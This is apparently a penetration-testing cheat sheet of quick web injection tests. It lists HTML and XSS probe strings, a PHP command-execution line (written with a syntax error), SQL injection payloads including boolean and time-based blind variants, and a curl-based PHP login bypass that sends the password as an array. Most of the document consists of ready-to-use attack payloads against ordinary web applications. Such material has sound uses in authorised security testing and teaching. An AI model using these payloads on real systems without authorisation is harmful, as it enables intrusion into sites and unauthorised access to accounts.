# Web Quick Tests  

Test the following types of injections in any field that supports values that will be shown back on the page.  
(e.g. "Search bar", "Contact Us", "Comment Box", "Forums", "Signup", "Login Page").  


## HTML Injection  

>Source: Software Testing Help [HTML Injection Tutorial][html_injection_tutorial]  

Enter simple HTML code to check if the text would be displayed.  

```html
<h1>HTML Injection testing</h1>
```

```html
<html>
<body>
<script>
alert( 'Hello, world!' );
</script>
</body>
</html>
```


## XSS Injection  
`<script>alert('XSS test')</script>`  


## PHP Command Execution  

```php
<?php system("whoami"; ?>
```

## SQL injection  

### Magic Sentence    

```sql
' or 1=1-- -
```

### Injections in Variables  

| Inyeccion | URL Encoded |
| --------- | ----------- |
| ".)('(,),( | %22.%29%28%27%28%2C%29%2C%28 |
| 'HAgddq<'">mQVbLJ | %27HAgddq%3C%27%22%3EmQVbLJ |

### Error Based Injection  

```sql
' order by 100-- -
```

## Blind SQL Injection  
In the user field of a login:  

```sql
AnyUser ' or if(1=1, sleep(5),1)-- -
```
If we have SQL injection, the page response will take 5s  

```sql
ValidUser ' and sleep(15)-- -
```
if the user is correct (exits), and we have SQL injection, the response from the page will take 15s  


## Having Valid User

### PHP Login Bypass with Array 
If the password is hardcoded in the php code of the page and a compare is used in the php code, it may be possible to bypass the login indicating when passing the password field that this field is an array (there is a problem that when you make these comparisons allows access).

E.g:
For a request of the type:
`curl -X POST http://<ip_target>/login.php --data 'username=<valid_user>&password=<pass_unknown>'`  
Return an unallowed login.
This would grant us access
`curl -X POST http://<ip_target>/login.php --data 'username=<valid_user>&password[]=<pass_unknown>'`
